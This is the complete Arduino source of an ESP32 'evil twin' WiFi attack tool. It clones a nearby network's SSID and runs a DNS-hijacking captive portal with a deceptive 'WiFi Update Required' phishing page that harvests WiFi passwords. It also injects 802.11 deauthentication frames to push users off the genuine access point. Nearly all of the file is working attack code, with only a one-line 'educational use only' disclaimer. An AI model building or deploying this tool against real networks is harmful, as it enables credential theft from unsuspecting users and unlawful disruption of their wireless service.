/*
 * H7 — Evil Twin AP
 * Clone any WiFi SSID, create fake AP, capture credentials via captive portal
 * 
 * Hardware: ESP32-C6
 * 
 * Usage:
 *   1. Power on — scans for nearby networks
 *   2. Select target SSID via serial
 *   3. Creates evil twin AP with same SSID
 *   4. Deauths original AP to force reconnection
 *   5. Captures credentials via captive portal
 * 
 * WARNING: Educational use only. Test on your own networks.
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <Preferences.h>

// Configuration
#define MAX_NETWORKS 20
#define DEAUTH_CHANNEL 6
#define SCAN_INTERVAL 10000  // 10 seconds

// Captive Portal HTML
const char captive_portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Update Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: 0 auto; }
        h1 { color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { background: #007bff; color: white; padding: 12px 24px; border: none; cursor: pointer; width: 100%; }
        button:hover { background: #0056b3; }
        .warning { color: #dc3545; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Network Update</h1>
        <p>Please enter your WiFi password to continue.</p>
        <form method="POST" action="/login">
            <input type="text" name="ssid" placeholder="WiFi Name" required>
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <p class="warning">This is a legitimate network update request.</p>
    </div>
</body>
</html>
)rawliteral";

// Captured credentials
struct Credential {
    char ssid[33];
    char password[65];
    char client_mac[18];
    uint32_t timestamp;
};

// Global objects
WebServer server(80);
DNSServer dnsServer;
Preferences preferences;
Credential captured_creds[10];
int cred_count = 0;

// WiFi scan results
struct NetworkInfo {
    char ssid[33];
    int rssi;
    uint8_t channel;
    uint8_t bssid[6];
    bool encrypted;
};

NetworkInfo networks[MAX_NETWORKS];
int network_count = 0;
int selected_network = -1;
bool ap_active = false;

// Evil Twin AP config
const char* evil_ssid = "Free_WiFi";
uint8_t evil_channel = 6;
uint8_t evil_bssid[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};

// Deauth packet (802.11 deauthentication frame)
uint8_t deauth_packet[] = {
    0xC0, 0x00,  // Frame control: Deauthentication
    0x3A, 0x01,  // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: will be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: will be filled
    0x00, 0x00,  // Sequence number
    0x07, 0x00   // Reason code: Class 3 frame from non-associated
};

// Function prototypes
void scanNetworks();
void selectNetwork(int index);
void startEvilTwin();
void handleRoot();
void handleLogin();
void handleRedirect();
void startDeauth();
void deauthClient(uint8_t* client_mac, uint8_t* bssid);

void setup() {
    Serial.begin(115200);
    Serial.println("\n=== H7 — Evil Twin AP ===");
    Serial.println("WARNING: Educational use only!");
    Serial.println();
    
    // Initialize preferences
    preferences.begin("h7-evil-twin", false);
    
    // Start in station mode for scanning
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("Scanning for networks...");
    scanNetworks();
    
    Serial.println("\nReady. Commands:");
    Serial.println("  scan    - Rescan for networks");
    Serial.println("  select N - Select network N");
    Serial.println("  start   - Start evil twin AP");
    Serial.println("  stop    - Stop evil twin AP");
    Serial.println("  deauth  - Start deauth attack");
    Serial.println("  creds   - Show captured credentials");
}

void loop() {
    // Handle DNS for captive portal
    if (ap_active) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
    
    // Handle serial commands
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd == "scan") {
            scanNetworks();
        } else if (cmd.startsWith("select ")) {
            int idx = cmd.substring(7).toInt();
            selectNetwork(idx);
        } else if (cmd == "start") {
            startEvilTwin();
        } else if (cmd == "stop") {
            if (ap_active) {
                server.stop();
                dnsServer.stop();
                WiFi.softAPdisconnect();
                ap_active = false;
                Serial.println("Evil twin AP stopped.");
            }
        } else if (cmd == "deauth") {
            startDeauth();
        } else if (cmd == "creds") {
            showCredentials();
        } else {
            Serial.println("Unknown command: " + cmd);
        }
    }
}

void scanNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    network_count = WiFi.scanNetworks();
    if (network_count > MAX_NETWORKS) network_count = MAX_NETWORKS;
    
    Serial.println("\n=== Available Networks ===");
    for (int i = 0; i < network_count; i++) {
        strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        
        Serial.printf("[%2d] %-32s CH:%2d RSSI:%3d %s\n",
                     i, networks[i].ssid, networks[i].channel,
                     networks[i].rssi, networks[i].encrypted ? "ENC" : "OPEN");
    }
    Serial.println("========================\n");
}

void selectNetwork(int index) {
    if (index < 0 || index >= network_count) {
        Serial.println("Invalid network index!");
        return;
    }
    
    selected_network = index;
    evil_channel = networks[index].channel;
    memcpy(evil_bssid, networks[index].bssid, 6);
    
    // Increment last byte of BSSID for uniqueness
    evil_bssid[5]++;
    
    Serial.printf("Selected: %s (CH:%d)\n", networks[index].ssid, evil_channel);
    Serial.printf("Evil twin BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 evil_bssid[0], evil_bssid[1], evil_bssid[2],
                 evil_bssid[3], evil_bssid[4], evil_bssid[5]);
}

void startEvilTwin() {
    if (selected_network < 0) {
        Serial.println("No network selected! Use 'select N'");
        return;
    }
    
    Serial.printf("Starting evil twin: %s (CH:%d)\n",
                 networks[selected_network].ssid, evil_channel);
    
    // Set WiFi mode to AP+STA
    WiFi.mode(WIFI_AP_STA);
    
    // Configure AP
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), 
                     IPAddress(192, 168, 4, 1), 
                     IPAddress(255, 255, 255, 0));
    
    // Start AP with cloned SSID
    WiFi.softAP(networks[selected_network].ssid, NULL, evil_channel);
    
    // Set custom BSSID
    esp_wifi_set_mac(WIFI_IF_AP, evil_bssid);
    
    // Start DNS server for captive portal
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    
    // Setup web server
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/generate_204", handleRedirect);
    server.on("/hotspot-detect.html", handleRedirect);
    server.on("/connecttest.txt", handleRedirect);
    server.on("/success.txt", handleRedirect);
    server.onNotFound(handleRoot);
    server.begin();
    
    ap_active = true;
    
    Serial.println("Evil twin AP active!");
    Serial.println("Captive portal running on 192.168.4.1");
    Serial.println("Waiting for victims...\n");
}

void handleRoot() {
    server.send(200, "text/html", captive_portal_html);
}

void handleLogin() {
    String ssid = server.arg("ssid");
    String password = server.arg("password");
    String client_mac = WiFi.softAPmacAddress();
    
    // Store credential
    if (cred_count < 10) {
        strncpy(captured_creds[cred_count].ssid, ssid.c_str(), 32);
        strncpy(captured_creds[cred_count].password, password.c_str(), 64);
        strncpy(captured_creds[cred_count].client_mac, client_mac.c_str(), 17);
        captured_creds[cred_count].timestamp = millis();
        cred_count++;
    }
    
    // Log to serial
    Serial.println("\n*** CREDENTIAL CAPTURED ***");
    Serial.printf("SSID: %s\n", ssid.c_str());
    Serial.printf("Password: %s\n", password.c_str());
    Serial.printf("Client: %s\n", client_mac.c_str());
    Serial.println("**************************\n");
    
    // Show thank you page
    server.send(200, "text/html", 
        "<!DOCTYPE html><html><head><title>Connected</title></head>"
        "<body><h1>Connected!</h1><p>You are now connected to the network.</p></body></html>");
}

void handleRedirect() {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
}

void startDeauth() {
    if (selected_network < 0) {
        Serial.println("No network selected!");
        return;
    }
    
    Serial.println("Starting deauth attack...");
    Serial.printf("Target: %s (BSSID: %02X:%02X:%02X:%02X:%02X:%02X)\n",
                 networks[selected_network].ssid,
                 networks[selected_network].bssid[0],
                 networks[selected_network].bssid[1],
                 networks[selected_network].bssid[2],
                 networks[selected_network].bssid[3],
                 networks[selected_network].bssid[4],
                 networks[selected_network].bssid[5]);
    
    // Set channel
    esp_wifi_set_channel(networks[selected_network].channel, WIFI_SECOND_CHAN_NONE);
    
    // Send deauth packets (broadcast deauth)
    for (int i = 0; i < 50; i++) {
        // Fill in source and BSSID
        memcpy(&deauth_packet[10], evil_bssid, 6);
        memcpy(&deauth_packet[16], networks[selected_network].bssid, 6);
        
        // Send deauth
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        
        delay(10);
    }
    
    Serial.println("Deauth packets sent (50 frames)");
}

void deauthClient(uint8_t* client_mac, uint8_t* bssid) {
    // Targeted deauth to specific client
    uint8_t targeted_deauth[] = {
        0xC0, 0x00,  // Frame control: Deauthentication
        0x3A, 0x01,  // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Destination: client
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence number
        0x07, 0x00   // Reason code
    };
    
    memcpy(&targeted_deauth[4], client_mac, 6);
    memcpy(&targeted_deauth[10], bssid, 6);
    memcpy(&targeted_deauth[16], bssid, 6);
    
    for (int i = 0; i < 20; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, targeted_deauth, sizeof(targeted_deauth), false);
        delay(10);
    }
    
    Serial.printf("Deauth sent to %02X:%02X:%02X:%02X:%02X:%02X\n",
                 client_mac[0], client_mac[1], client_mac[2],
                 client_mac[3], client_mac[4], client_mac[5]);
}

void showCredentials() {
    if (cred_count == 0) {
        Serial.println("No credentials captured yet.");
        return;
    }
    
    Serial.println("\n=== Captured Credentials ===");
    for (int i = 0; i < cred_count; i++) {
        Serial.printf("[%d] SSID: %s\n", i, captured_creds[i].ssid);
        Serial.printf("    Pass: %s\n", captured_creds[i].password);
        Serial.printf("    Time: %lu ms\n", captured_creds[i].timestamp);
        Serial.println();
    }
    Serial.println("============================\n");
}
